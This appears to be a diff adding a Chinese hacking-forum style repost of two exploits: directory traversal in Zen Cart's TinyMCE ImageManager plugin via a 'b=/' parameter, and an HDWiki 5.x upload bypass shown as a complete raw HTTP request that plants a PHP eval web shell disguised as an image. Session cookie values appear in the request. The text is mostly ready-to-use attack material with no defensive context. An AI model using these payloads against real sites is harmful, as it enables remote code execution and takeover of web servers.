@@ -1,0 +1,17 @@
+zencart编辑器tiny_mce的跨目录操作漏洞
+
+http://www.xssxss.com/fuck/463.xss
+
+现补充一个
+提交
+http://www.92hack.net/editors/tiny_mce/plugins/ImageManager/manager.php?b=/
+
+
+
+Hudong HDWiki 5.1 URI SQL注入漏洞By: 狗一样的男人 0 COMMENTS 
+hdwiki是互动百科开发的一款免费建站，自助建站程序HDWIKI V5.0 基本上没有对输入的变量进行过滤,存在多个sql注入漏洞，如发表评论的地方存在代码注入问题另外HDwiki中某些上传功能存在安全漏洞，通过一些数据即可绕过上传限制，最终获得shell
+
+
+POST /hdwiki/index.php?attachment-uploadimg HTTP/1.1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */* Referer: http://www.wooyun.org/ Accept-Language: zh-cn Content-Type: multipart/form-data; boundary=---------------------------7db261e100f2e User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; InfoPath.2) Host: www.wooyun.org Content-Length: 370 Connection: Keep-Alive Cache-Control: no-cache Cookie: Hm_lvt_c12f88b5c1cd041a732dea597a5ec94c=1298002704449; hd_sid=raG13H; hd_auth=4113YBBXXB13XtdR6EXTA1Cb9BuhZMK%2F29wdoHDQJTV5QZOoYd62OHd46iXKqf4Qz%2F5gc6pLm9fZ%2Bdgv68MT; hd_searchtime=1300983373 -----------------------------7db261e100f2e Content-Disposition: form-data; name="MAX_FILE_SIZE" 30000 -----------------------------7db261e100f2e Content-Disposition: form-data; name="photofile"; filename="C:\fucker\z.php" Content-Type: image/image zzz<?eval($_REQUEST[z])?> -----------------------------7db261e100f2e--
+
+
